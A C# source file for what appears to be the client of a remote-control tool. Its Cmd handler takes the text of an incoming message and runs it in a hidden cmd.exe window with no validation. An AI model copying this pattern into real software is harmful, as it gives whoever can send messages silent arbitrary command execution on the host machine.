using System;
using System.Diagnostics;
using MiddleProject;
using MiddleProject.impl;
using MiddleProject.model;

namespace Client.accept
{
    public class Cmd:IAccept
    {
        public void acceptMessage(Result result)
        {
            Data data = result.data;
            if (data.code==OrderCode.Cmd)
            {
                try
                {
                    //创建一个进程
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.UseShellExecute = false; //是否使用操作系统shell启动
                    p.StartInfo.RedirectStandardInput = true; //接受来自调用程序的输入信息
                    p.StartInfo.RedirectStandardOutput = true; //由调用程序获取输出信息
                    p.StartInfo.RedirectStandardError = true; //重定向标准错误输出
                    p.StartInfo.CreateNoWindow = true; //不显示程序窗口
                    p.Start(); //启动程序

                    string strCMD = data.msg;
                    //向cmd窗口发送输入信息
                    p.StandardInput.WriteLine(strCMD + "&exit");

                    p.StandardInput.AutoFlush = true;

                    //获取cmd窗口的输出信息
                    //string output = p.StandardOutput.ReadToEnd();
                    //等待程序执行完退出进程
                    p.WaitForExit();
                    p.Close();
                }
                catch (Exception e)
                {
                    LogUtil.Error(e.StackTrace);
                }
            }
        }
    }
}